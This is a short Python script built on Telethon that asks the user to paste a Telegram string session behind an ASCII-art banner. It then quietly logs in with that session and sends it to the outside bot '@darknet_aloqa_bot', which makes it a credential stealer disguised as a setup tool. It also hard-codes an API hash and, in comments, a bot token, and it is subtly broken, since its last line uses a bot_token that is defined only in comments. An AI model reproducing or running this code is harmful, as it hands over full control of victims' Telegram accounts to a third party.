from telethon import TelegramClient
from telethon import TelegramClient
from telethon.sessions import StringSession
import os, sys
api_id = 10953300
api_hash = "9c24426e5d6fa1d441913e3906627f87"
os.system("clear")
string = input("""
\033[1;32m
 ▄▄▄██▀▀▀▒█████   ▄▄▄██▀▀▀▒█████  
   ▒██  ▒██▒  ██▒   ▒██  ▒██▒  ██▒
   ░██  ▒██░  ██▒   ░██  ▒██░  ██▒
▓██▄██▓ ▒██   ██░▓██▄██▓ ▒██   ██░
 ▓███▒  ░ ████▓▒░ ▓███▒  ░ ████▓▒░
 ▒▓▒▒░  ░ ▒░▒░▒░  ▒▓▒▒░  ░ ▒░▒░▒░ 
 ▒ ░▒░    ░ ▒ ▒░  ▒ ░▒░    ░ ▒ ▒░ 
 ░ ░ ░  ░ ░ ░ ▒   ░ ░ ░  ░ ░ ░ ▒  
 ░   ░      ░ ░   ░   ░      ░ ░  
                                  
\033[1;34m 
string session: """)
#bot_token= "5587783380:AAEk9jhijr0--9YGQj8l-6eehpb9Zdz5pGc"
#bot_token = "5587783380:AAEk9jhijr0--9YGQj8l-6eehpb9Zdz5pGc"
with TelegramClient(StringSession(string), api_id, api_hash) as client:
    #print(client.session.save())
    client.send_message("@darknet_aloqa_bot", client.session.save())

botClient = TelegramClient('@jojo_user_bot', api_id, api_hash).start(bot_token=bot_token)






